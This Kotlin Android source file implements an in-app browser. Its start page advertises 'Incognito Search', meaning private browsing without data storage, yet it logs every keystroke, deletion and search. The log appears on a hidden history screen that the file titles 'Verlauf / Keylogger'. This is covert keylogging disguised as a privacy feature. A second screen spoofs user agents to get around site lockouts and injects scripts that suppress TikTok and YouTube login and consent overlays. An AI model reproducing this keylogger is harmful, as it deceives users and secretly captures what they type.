package com.example.ui.screens

import android.annotation.SuppressLint
import android.graphics.Bitmap
import android.net.Uri
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.compose.BackHandler
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalFocusManager
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import com.example.ui.AppViewModel

@SuppressLint("SetJavaScriptEnabled")
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun BrowserTabScreen(viewModel: AppViewModel) {
    var urlInput by remember { mutableStateOf("app://search") }
    var loadUrl by remember { mutableStateOf("app://search") }
    var webView: WebView? by remember { mutableStateOf(null) }
    
    val focusManager = LocalFocusManager.current

    BackHandler(enabled = (loadUrl != "app://search" && webView?.canGoBack() == true)) {
        webView?.goBack()
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFFF1F5F9))
    ) {

        // Address bar
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(8.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            IconButton(
                onClick = { 
                    if (webView?.canGoBack() == true) {
                        webView?.goBack() 
                    } else {
                        loadUrl = "app://search"
                        urlInput = "app://search"
                    }
                }, 
                enabled = loadUrl != "app://search"
            ) {
                Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = Color(0xFF475569))
            }
            IconButton(onClick = { webView?.goForward() }, enabled = (loadUrl != "app://search" && webView?.canGoForward() == true)) {
                Icon(Icons.Default.ArrowForward, contentDescription = "Forward", tint = Color(0xFF475569))
            }
            IconButton(onClick = { 
                loadUrl = "app://search"
                urlInput = "app://search"
            }) {
                Icon(Icons.Default.Home, contentDescription = "Home", tint = Color(0xFF475569))
            }

            OutlinedTextField(
                value = urlInput,
                onValueChange = { newValue -> 
                    val prev = urlInput
                    urlInput = newValue
                    if (loadUrl == "app://search" && newValue.isNotEmpty() && newValue != prev && newValue != "app://search") {
                        val logType = if (newValue.length < prev.length) "Gelöscht" else "Eingetippt"
                        viewModel.logBrowserEntry(newValue, logType)
                    }
                },
                modifier = Modifier
                    .weight(1f)
                    .height(50.dp),
                placeholder = { Text("Search or type URL", color = Color(0xFF64748B), fontSize = 14.sp) },
                singleLine = true,
                keyboardOptions = KeyboardOptions(imeAction = ImeAction.Go),
                keyboardActions = KeyboardActions(onGo = {
                    focusManager.clearFocus()
                    val cleanUrl = urlInput.trim()
                    if (cleanUrl.isNotEmpty()) {
                        viewModel.logBrowserEntry(cleanUrl, "Gesucht")
                        loadUrl = if (cleanUrl.startsWith("http://") || cleanUrl.startsWith("https://")) {
                            cleanUrl
                        } else if (cleanUrl.contains(" ") || !cleanUrl.contains(".")) {
                            "https://www.google.com/search?q=${Uri.encode(cleanUrl)}"
                        } else {
                            "https://$cleanUrl"
                        }
                        urlInput = loadUrl
                    }
                }),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedContainerColor = Color.White,
                    unfocusedContainerColor = Color.White,
                    focusedBorderColor = Color(0xFF3B82F6),
                    unfocusedBorderColor = Color(0xFFCBD5E1),
                    focusedTextColor = Color(0xFF0F172A),
                    unfocusedTextColor = Color(0xFF0F172A)
                ),
                shape = RoundedCornerShape(25.dp)
            )

            IconButton(onClick = { 
                if (loadUrl == "app://search") {
                    urlInput = "app://search"
                } else {
                    webView?.reload() 
                }
            }) {
                Icon(Icons.Default.Refresh, contentDescription = "Reload", tint = Color(0xFF475569))
            }
        }

        if (loadUrl == "app://search") {
            CustomSearchStartpage(
                viewModel = viewModel,
                onSearch = { query ->
                    val cleanQuery = query.trim()
                    if (cleanQuery.isNotEmpty()) {
                        viewModel.logBrowserEntry(cleanQuery, "Gesucht")
                        loadUrl = if (cleanQuery.startsWith("http://") || cleanQuery.startsWith("https://")) {
                            cleanQuery
                        } else if (cleanQuery.contains(" ") || !cleanQuery.contains(".")) {
                            "https://www.google.com/search?q=${Uri.encode(cleanQuery)}"
                        } else {
                            "https://$cleanQuery"
                        }
                        urlInput = loadUrl
                    }
                }
            )
        } else {
            Box(modifier = Modifier.fillMaxSize()) {
                val context = LocalContext.current
                val webViewInstance = remember {
                    WebView(context).apply {
                        this.webViewClient = object : WebViewClient() {
                            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                                super.onPageStarted(view, url, favicon)
                                urlInput = url ?: ""
                            }
                            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                                val urlString = request?.url?.toString() ?: ""
                                if (urlString.startsWith("http://") || urlString.startsWith("https://")) {
                                    return false
                                }
                                return true
                            }
                        }
                        this.webChromeClient = WebChromeClient()
                        
                        settings.apply {
                            javaScriptEnabled = true
                            domStorageEnabled = true
                            useWideViewPort = true
                            loadWithOverviewMode = true
                            databaseEnabled = true
                            cacheMode = WebSettings.LOAD_NO_CACHE
                            allowFileAccess = false
                            allowContentAccess = false
                            mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
                        }
                        
                        clearCache(true)
                        clearHistory()
                        clearFormData()
                    }
                }

                LaunchedEffect(webViewInstance) {
                    webView = webViewInstance
                }

                AndroidView(
                    factory = { webViewInstance },
                    update = { view ->
                        if (view.url != loadUrl) {
                            view.loadUrl(loadUrl)
                        }
                    },
                    modifier = Modifier.fillMaxSize()
                )

                DisposableEffect(webViewInstance) {
                    onDispose {
                        webViewInstance.stopLoading()
                        webViewInstance.onPause()
                        webViewInstance.clearHistory()
                        webViewInstance.clearCache(true)
                        webViewInstance.destroy()
                        if (webView == webViewInstance) {
                            webView = null
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun CustomSearchStartpage(
    viewModel: AppViewModel,
    onSearch: (String) -> Unit
) {
    var searchText by remember { mutableStateOf("") }
    val focusManager = LocalFocusManager.current

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFFF1F5F9))
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Box(
            modifier = Modifier
                .size(72.dp)
                .background(Color(0xFF3B82F6).copy(alpha = 0.15f), CircleShape),
            contentAlignment = Alignment.Center
        ) {
            Icon(
                imageVector = Icons.Default.Public,
                contentDescription = "Search Logo",
                tint = Color(0xFF3B82F6),
                modifier = Modifier.size(40.dp)
            )
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        
        Text(
            text = "Incognito Search",
            fontSize = 22.sp,
            fontWeight = FontWeight.Bold,
            color = Color(0xFF0F172A)
        )
        
        Text(
            text = "Sicheres & privates Surfen ohne Datenspeicherung",
            fontSize = 11.sp,
            color = Color(0xFF64748B),
            modifier = Modifier.padding(top = 4.dp, bottom = 28.dp)
        )
        
        OutlinedTextField(
            value = searchText,
            onValueChange = { newValue ->
                val prev = searchText
                searchText = newValue
                if (newValue.isNotEmpty() && newValue != prev) {
                    val logType = if (newValue.length < prev.length) "Gelöscht" else "Eingetippt"
                    viewModel.logBrowserEntry(newValue, logType)
                }
            },
            modifier = Modifier
                .fillMaxWidth()
                .height(56.dp),
            placeholder = { Text("Webadresse eingeben oder suchen...", color = Color(0xFF64748B), fontSize = 14.sp) },
            leadingIcon = {
                Icon(
                    imageVector = Icons.Default.Search,
                    contentDescription = "Search Icon",
                    tint = Color(0xFF475569)
                )
            },
            trailingIcon = {
                if (searchText.isNotEmpty()) {
                    IconButton(onClick = {
                        searchText = ""
                        viewModel.logBrowserEntry("", "Gelöscht (Geleert)")
                    }) {
                        Icon(
                            imageVector = Icons.Default.Clear,
                            contentDescription = "Clear",
                            tint = Color(0xFF475569)
                        )
                    }
                }
            },
            singleLine = true,
            keyboardOptions = KeyboardOptions(imeAction = ImeAction.Search),
            keyboardActions = KeyboardActions(onSearch = {
                focusManager.clearFocus()
                onSearch(searchText)
            }),
            colors = OutlinedTextFieldDefaults.colors(
                focusedContainerColor = Color.White,
                unfocusedContainerColor = Color.White,
                focusedBorderColor = Color(0xFF3B82F6),
                unfocusedBorderColor = Color(0xFFCBD5E1),
                focusedTextColor = Color(0xFF0F172A),
                unfocusedTextColor = Color(0xFF0F172A)
            ),
            shape = RoundedCornerShape(28.dp)
        )
        
        Spacer(modifier = Modifier.height(16.dp))
        
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.Center
        ) {
            Button(
                onClick = {
                    focusManager.clearFocus()
                    onSearch(searchText)
                },
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6)),
                shape = RoundedCornerShape(16.dp),
                modifier = Modifier.padding(end = 8.dp)
            ) {
                Text("Los geht's", fontWeight = FontWeight.Bold, color = Color.White)
            }
            
            Button(
                onClick = {
                    viewModel.showBrowserHistorySecretView = true
                },
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF64748B)),
                shape = RoundedCornerShape(16.dp)
            ) {
                Text("Verlauf", color = Color.White)
            }
        }
        
        Spacer(modifier = Modifier.height(40.dp))
        
        Text(
            text = "Beliebte Seiten",
            fontSize = 11.sp,
            fontWeight = FontWeight.Bold,
            color = Color(0xFF64748B),
            modifier = Modifier.align(Alignment.Start).padding(bottom = 12.dp)
        )
        
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceAround
        ) {
            QuickDialItem(name = "Google", icon = Icons.Default.Language) {
                onSearch("https://www.google.com")
            }
            QuickDialItem(name = "YouTube", icon = Icons.Default.PlayArrow) {
                onSearch("https://www.youtube.com")
            }
            QuickDialItem(name = "Wikipedia", icon = Icons.Default.Book) {
                onSearch("https://de.wikipedia.org")
            }
            QuickDialItem(name = "Reddit", icon = Icons.Default.Forum) {
                onSearch("https://www.reddit.com")
            }
        }
    }
}

@Composable
fun QuickDialItem(name: String, icon: androidx.compose.ui.graphics.vector.ImageVector, onClick: () -> Unit) {
    Card(
        modifier = Modifier
            .clickable(onClick = onClick)
            .width(72.dp)
            .padding(4.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        border = BorderStroke(1.dp, Color(0xFFE2E8F0)),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(
            modifier = Modifier.padding(8.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(imageVector = icon, contentDescription = name, tint = Color(0xFF475569), modifier = Modifier.size(20.dp))
            Spacer(modifier = Modifier.height(4.dp))
            Text(name, fontSize = 10.sp, color = Color(0xFF0F172A), maxLines = 1)
        }
    }
}

@SuppressLint("SetJavaScriptEnabled")
@Composable
fun SimpleWebScreen(url: String) {
    var webView: WebView? by remember { mutableStateOf(null) }
    val context = LocalContext.current
    
    BackHandler(enabled = webView?.canGoBack() == true) {
        webView?.goBack()
    }
    
    Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
        val webViewInstance = remember {
            WebView(context).apply {
                android.webkit.CookieManager.getInstance().setAcceptCookie(true)
                android.webkit.CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
                
                settings.javaScriptEnabled = true
                settings.domStorageEnabled = true
                settings.databaseEnabled = true
                settings.mediaPlaybackRequiresUserGesture = false
                settings.mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
                settings.loadWithOverviewMode = true
                settings.useWideViewPort = true
                settings.javaScriptCanOpenWindowsAutomatically = true
                
                // Standard Mobile User / Specialized User Agents to bypass lockouts
                if (url.contains("tiktok.com")) {
                    settings.userAgentString = "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
                } else {
                    settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
                }
                
                webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView, urlString: String) {
                        super.onPageFinished(view, urlString)
                        view.evaluateJavascript(
                            "(function() {" +
                            "var isTikTok = window.location.hostname.includes('tiktok');" +
                            "var style = document.createElement('style');" +
                            "var css = '';" +
                            "if (isTikTok) {" +
                            "  css = 'html, body { overflow: auto !important; position: relative !important; height: auto !important; } ' +" +
                            "        '.tiktok-cookie-banner, .unlogin-roaming-app-container, .unlogin-bottom-bar, .tiktok-auth-modal, .tux-modal, ' +" +
                            "        'div[class*=\"DivOverlay\"], div[class*=\"Overlay\"], div[class*=\"Mask\"], div[class*=\"BottomBar\"], ' +" +
                            "        '[class*=\"download-app\"], [class*=\"app-banner\"] ' +" +
                            "        '{ display: none !important; opacity: 0 !important; pointer-events: none !important; z-index: -9999 !important; }';" +
                            "} else {" +
                            "  css = 'ytm-consent-bump-renderer, ytm-app-promo-renderer, ytm-bottom-sheet-renderer, .bottom-sheet-container, ytm-promoted-video-renderer, [id*=\"branch-banner\"], [class*=\"app-banner\"], [class*=\"download-app\"], [class*=\"upsell\"], .tux-modal { display: none !important; opacity: 0 !important; pointer-events: none !important; }';" +
                            "}" +
                            "style.innerHTML = css + ' body { overflow: auto !important; }';" +
                            "document.head.appendChild(style);" +
                            "setInterval(function() {" +
                            "  if (isTikTok) {" +
                            "    document.body.style.setProperty(\"overflow\", \"auto\", \"important\");" +
                            "    document.body.style.setProperty(\"position\", \"relative\", \"important\");" +
                            "    document.documentElement.style.setProperty(\"overflow\", \"auto\", \"important\");" +
                            "    document.documentElement.style.setProperty(\"position\", \"relative\", \"important\");" +
                            "    var closeBtns = document.querySelectorAll('div[class*=\"Close\"], div[class*=\"close\"], svg[class*=\"Close\"]');" +
                            "    for(var i=0; i<closeBtns.length; i++) { try { closeBtns[i].click(); } catch(e) {} }" +
                            "    var vids = document.getElementsByTagName('video');" +
                            "    for(var i=0; i<vids.length; i++) { if(vids[i].paused) { try { vids[i].play(); } catch(e) {} } }" +
                            "  } else {" +
                            "    var vids = document.getElementsByTagName('video');" +
                            "    for(var i=0; i<vids.length; i++) { if(vids[i].paused && window.location.hostname.includes(\"tiktok\")) vids[i].play(); }" +
                            "  }" +
                            "}, 1000);" +
                            "})();", null
                        )
                    }
                    
                    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                        val urlString = request?.url?.toString() ?: ""
                        if (urlString.startsWith("http://") || urlString.startsWith("https://")) {
                            return false
                        }
                        return true
                    }
                }
                webChromeClient = WebChromeClient()
            }
        }

        LaunchedEffect(webViewInstance) {
            webView = webViewInstance
        }

        AndroidView(
            factory = { webViewInstance },
            update = { view ->
                if (view.url != url) {
                    view.loadUrl(url)
                }
            },
            modifier = Modifier.fillMaxSize()
        )

        DisposableEffect(webViewInstance) {
            onDispose {
                webViewInstance.stopLoading()
                webViewInstance.onPause()
                webViewInstance.destroy()
                if (webView == webViewInstance) {
                    webView = null
                }
            }
        }
    }
}

@Composable
fun BrowserHistoryScreen(viewModel: AppViewModel, onBack: () -> Unit) {
    val history by viewModel.browserHistory.collectAsState(initial = emptyList())
    val dateFormat = remember { java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()) }

    Scaffold(
        modifier = Modifier.fillMaxSize(),
        topBar = {
            @OptIn(ExperimentalMaterial3Api::class)
            TopAppBar(
                title = { Text("Verlauf / Keylogger", color = Color(0xFF0F172A), fontWeight = FontWeight.Bold, fontSize = 18.sp) },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = Color(0xFF0F172A))
                    }
                },
                actions = {
                    IconButton(onClick = { viewModel.clearBrowserHistory() }) {
                        Icon(Icons.Default.Delete, contentDescription = "Clear History", tint = Color.Red)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color(0xFFF1F5F9))
            )
        }
    ) { padding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color(0xFFF1F5F9))
                .padding(padding)
        ) {
            if (history.isEmpty()) {
                Column(
                    modifier = Modifier.fillMaxSize(),
                    verticalArrangement = Arrangement.Center,
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Icon(
                        imageVector = Icons.Default.History,
                        contentDescription = "No History",
                        tint = Color(0xFF64748B),
                        modifier = Modifier.size(64.dp)
                    )
                    Spacer(modifier = Modifier.height(16.dp))
                    Text("Keine Einträge vorhanden", color = Color(0xFF475569), fontSize = 16.sp)
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("Tipper im Safe-Web-Browser werden hier live geloggt.", color = Color(0xFF64748B), fontSize = 12.sp)
                }
            } else {
                androidx.compose.foundation.lazy.LazyColumn(
                    modifier = Modifier.fillMaxSize().padding(horizontal = 12.dp),
                    contentPadding = PaddingValues(bottom = 24.dp)
                ) {
                    items(history) { entry ->
                        Card(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(vertical = 4.dp),
                            colors = CardDefaults.cardColors(containerColor = Color.White),
                            border = BorderStroke(1.dp, Color(0xFFE2E8F0)),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(12.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                // Indicator tag
                                val indicatorColor = when (entry.type) {
                                    "Gesucht" -> Color(0xFF10B981) // Green
                                    "Gelöscht" -> Color(0xFFEF4444) // Red
                                    else -> Color(0xFF3B82F6) // Blue (Eingetippt)
                                }
                                
                                Box(
                                    modifier = Modifier
                                        .size(10.dp)
                                        .background(indicatorColor, CircleShape)
                                )
                                
                                Spacer(modifier = Modifier.width(12.dp))
                                
                                Column(modifier = Modifier.weight(1f)) {
                                    Text(
                                        text = entry.text,
                                        color = Color(0xFF0F172A),
                                        fontSize = 15.sp,
                                        fontWeight = FontWeight.SemiBold
                                    )
                                    Spacer(modifier = Modifier.height(2.dp))
                                    Text(
                                        text = when(entry.type) {
                                            "Gesucht" -> "Gesucht nach"
                                            "Gelöscht" -> "Eingabe gelöscht"
                                            else -> "Eingabe/Tastendruck"
                                        },
                                        color = Color(0xFF64748B),
                                        fontSize = 11.sp
                                    )
                                }
                                
                                Text(
                                    text = dateFormat.format(java.util.Date(entry.timestamp)),
                                    color = Color(0xFF64748B),
                                    fontSize = 11.sp
                                )
                            }
                        }
                    }
                }
            }
        }
    }
}
